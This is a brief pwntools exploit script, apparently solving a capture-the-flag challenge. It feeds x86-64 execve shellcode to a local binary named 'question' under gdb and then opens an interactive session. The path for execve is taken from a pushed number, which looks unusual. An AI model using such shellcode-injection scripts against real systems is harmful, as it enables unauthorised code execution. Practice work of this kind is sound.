from pwn import *
from sys import argv

context.log_level = "debug"
context.os = "linux"
context.arch = "amd64"

binary = "./question"
elf = ELF(binary)

def dbg(p, cmd=None):
    gdb.attach(p, cmd)
    pause()


p = process(binary)

dbg(p)


shellcode = asm("""
    mov rax, 59
    push rax
    mov rdi, rsp 
    mov rsi, 0
    mov rdx, 0
    syscall
""")


p.sendlineafter("The challenge will execute the following shellcode:\n",shellcode)
p.interactive()
